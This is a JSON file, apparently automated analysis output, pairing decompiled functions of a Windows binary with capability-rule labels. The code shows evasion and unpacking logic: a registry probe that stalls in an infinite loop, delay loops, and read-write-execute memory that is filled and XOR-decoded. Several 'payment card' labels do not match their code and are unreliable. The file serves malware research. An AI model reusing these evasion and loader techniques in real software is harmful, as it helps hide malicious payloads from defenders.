{
    "00401140": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.00401140(void)\n\n{\n    *0x4180d0 = 0;\n    *(*0x41800c + 0x10) = 0x61;\n    *(*0x41800c + *0x4180d0 + 0x11) = *0x4180d0 + '8';\n    *(*0x41800c + *0x4180d0 + 0x12) = *0x4180d0 + '0';\n    *(*0x41800c + *0x4180d0 + 0x13) = *0x4180d0 + '-';\n    *(*0x41800c + *0x4180d0 + 0x14) = *0x4180d0 + 'b';\n    *(*0x41800c + *0x4180d0 + 0x15) = *0x4180d0 + '8';\n    *(*0x41800c + *0x4180d0 + 0x16) = *0x4180d0 + '3';\n    *(*0x41800c + *0x4180d0 + 0x17) = *0x4180d0 + '4';\n    *(*0x41800c + *0x4180d0 + 0x18) = *0x4180d0 + '-';\n    *(*0x41800c + *0x4180d0 + 0x19) = *0x4180d0 + '1';\n    *(*0x41800c + *0x4180d0 + 0x1a) = *0x4180d0 + '1';\n    *(*0x41800c + *0x4180d0 + 0x1b) = *0x4180d0 + 'd';\n    *(*0x41800c + *0x4180d0 + 0x1c) = *0x4180d0 + '0';\n    *(*0x41800c + *0x4180d0 + 0x1d) = *0x4180d0 + '-';\n    *(*0x41800c + *0x4180d0 + 0x1e) = *0x4180d0 + '9';\n    *(*0x41800c + *0x4180d0 + 0x1f) = *0x4180d0 + '3';\n    *(*0x41800c + *0x4180d0 + 0x20) = *0x4180d0 + '2';\n    *(*0x41800c + *0x4180d0 + 0x21) = *0x4180d0 + 'f';\n    *(*0x41800c + *0x4180d0 + 0x22) = *0x4180d0 + '-';\n    *(*0x41800c + *0x4180d0 + 0x23) = *0x4180d0 + '0';\n    *(*0x41800c + *0x4180d0 + 0x24) = *0x4180d0 + '0';\n    *(*0x41800c + *0x4180d0 + 0x25) = *0x4180d0 + 'a';\n    *(*0x41800c + *0x4180d0 + 0x26) = *0x4180d0 + '0';\n    *(*0x41800c + *0x4180d0 + 0x27) = *0x4180d0 + 'c';\n    *(*0x41800c + *0x4180d0 + 0x28) = *0x4180d0 + '9';\n    *(*0x41800c + *0x4180d0 + 0x29) = *0x4180d0 + '0';\n    *(*0x41800c + *0x4180d0 + 0x2a) = *0x4180d0 + 'd';\n    *(*0x41800c + *0x4180d0 + 0x2b) = *0x4180d0 + 'c';\n    *(*0x41800c + *0x4180d0 + 0x2c) = *0x4180d0 + 'a';\n    *(*0x41800c + *0x4180d0 + 0x2d) = *0x4180d0 + 'a';\n    *(*0x41800c + *0x4180d0 + 0x2e) = *0x4180d0 + '9';\n    *(*0x41800c + *0x4180d0 + 0x2f) = *0x4180d0 + '}';\n    *(*0x41800c + *0x4180d0 + 0x30) = 0;\n    *(*0x41800c + *0x4180d0) = *0x4180d0 + 'i';\n    *(*0x41800c + *0x4180d0 + 1) = *0x4180d0 + 'n';\n    *(*0x41800c + *0x4180d0 + 2) = *0x4180d0 + 't';\n    *(*0x41800c + *0x4180d0 + 3) = *0x4180d0 + 'e';\n    *(*0x41800c + *0x4180d0 + 4) = *0x4180d0 + 'r';\n    *(*0x41800c + *0x4180d0 + 5) = *0x4180d0 + 'f';\n    *(*0x41800c + *0x4180d0 + 6) = *0x4180d0 + 'a';\n    *(*0x41800c + *0x4180d0 + 7) = *0x4180d0 + 'c';\n    *(*0x41800c + *0x4180d0 + 8) = *0x4180d0 + 'e';\n    *(*0x41800c + *0x4180d0 + 9) = *0x4180d0 + '\\\\';\n    *(*0x41800c + *0x4180d0 + 10) = *0x4180d0 + '{';\n    *(*0x41800c + *0x4180d0 + 0xb) = *0x4180d0 + 'a';\n    *(*0x41800c + *0x4180d0 + 0xc) = *0x4180d0 + 'a';\n    *(*0x41800c + *0x4180d0 + 0xd) = *0x4180d0 + '5';\n    *(*0x41800c + *0x4180d0 + 0xe) = *0x4180d0 + 'b';\n    *(*0x41800c + *0x4180d0 + 0xf) = *0x4180d0 + '6';\n    return;\n}\n",
        "token_count": 1592
    },
    "004017f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004017f0(void)\n\n{\n    *0x418118 = (**0x4180f8)(0x80000000, *0x41800c, 0x418110);\n    if (*0x418118 == 0) {\n        return;\n    }\n    do {\n    // WARNING: Do nothing block with infinite loop\n    } while( true );\n}\n",
        "token_count": 84
    },
    "null": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl entry0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00401080();\n    *0x4180bc = arg_8h;\n    *0x4180f8 = _sym.imp.ADVAPI32.dll_RegOpenKeyA;\n    *0x41809c = &stack0xfffffffc;\n    fcn.004015f0();\n    *0x4180f0 = _sym.imp.ADVAPI32.dll_RegQueryValueExA;\n    *0x4180c4 = fcn.004016d0();\n    fcn.00401000();\n    *0x4180a8 = 0;\n    *0x4180ac = 0;\n    *0x4180a4 = 3;\n    while (*0x4180dc = fcn.00401030(*0x418008, *0x418088),  *0x4180a8 < *0x418084) {\n        fcn.00401830(0x17);\n        *0x41808c = *0x4180dc;\n        *0x4180ac = *0x4180a4 + *0x418008 + *0x4180ac;\n        *0x4180a8 = *0x418008 + *0x4180a8;\n        *0x418088 = *0x418088 - *0x4180dc;\n    }\n    uVar1 = fcn.00401630(4, 0x241);\n    return uVar1;\n}\n",
        "token_count": 353
    },
    "00401ac0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00401ac0(void)\n\n{\n    uint var_4h;\n    \n    return *(*0x4180c4 + -4);\n}\n",
        "token_count": 34
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401000(void)\n\n{\n    // [00] -r-x section size 8192 named .text\n    *0x418084 = fcn.00401ac0(0x37);\n    *0x4180d0 = *0x418084;\n    fcn.00401a30(1);\n    return;\n}\n",
        "token_count": 77
    },
    "00401080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401080(void)\n\n{\n    for (*0x4180d0 = 0xb; *0x4180d0 < 0x89c0c1b; *0x4180d0 = *0x4180d0 + 3) {\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "004010b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004010b0(void)\n\n{\n    *0x4180fc = *0x4180e4 - 2;\n    *0x41810c = **0x418100 ^ *0x4180e4;\n    *0x4180ec = *0x41810c;\n    **0x418100 = *0x41810c;\n    return;\n}\n",
        "token_count": 86
    },
    "00401130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401130(int32_t arg_8h)\n\n{\n    return arg_8h + 0x13f7;\n}\n",
        "token_count": 36
    },
    "00401610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401610(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    return arg_8h * 0x229;\n}\n",
        "token_count": 42
    },
    "00401630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401630(void)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < *0x418084; var_4h = var_4h + 4) {\n        *0x418114 = *0x4180c8 + var_4h;\n        fcn.004018a0(0xd05, var_4h);\n        *0x4180e4 = var_4h + 0xc745;\n        *0x418100 = *0x418114;\n        fcn.00401af0();\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "004016d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.004016d0(void)\n\n{\n    int32_t iVar1;\n    int32_t var_e8h;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x4180b8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x418104 = *(*0x4180b8 + 0x3c);\n    var_8h = 200;\n    var_4h = 1;\n    while (iVar1 = (**0x4180f0)(*0x418110, 0x4180e0, 0, &var_4h, &var_d0h, &var_8h),  iVar1 != 0) {\n        fcn.004016d0();\n    }\n    if (var_d0h._3_1_ == 't') {\n        *0x4180e8 = 0x4037bc;\n    }\n    *0x418060 = *0x418060 - 0x14d;\n    if ((*0x4180b8 < *0x418060) && (*0x418060 < *0x4180b8 + *(var_e8h + 0x38) * 4)) {\n        *0x418090 = 0;\n    }\n    else {\n        *0x4180b8 = *0x4180bc;\n        *0x418090 = 1;\n    }\n    return *0x4180e8;\n}\n",
        "token_count": 349
    },
    "00401830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401830(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = *0x4180c8 + *0x4180a8;\n    iVar2 = *0x4180c4 + *0x4180ac;\n    for (var_8h = 0; var_8h < *0x4180dc; var_8h = var_8h + 1) {\n        *(iVar1 + var_8h) = *(iVar2 + var_8h);\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "004018a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004018a0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    **0x418114 = arg_ch + **0x418114;\n    return;\n}\n",
        "token_count": 52
    },
    "00401a30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401a30(void)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x4180f4 = _sym.imp.KERNEL32.dll_VirtualAllocEx;\n    *0x4180c8 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(0xffffffff, 0, *0x418084, 0x3000, 0x40);\n    *0x418088 = *0x418084;\n    *0x418094 = *0x4180c8 + 0x102f0;\n    return *0x4180c8;\n}\n",
        "token_count": 160
    },
    "00401030": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401030(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < arg_ch) {\n        arg_ch = arg_8h;\n    }\n    return arg_ch;\n}\n",
        "token_count": 76
    }
}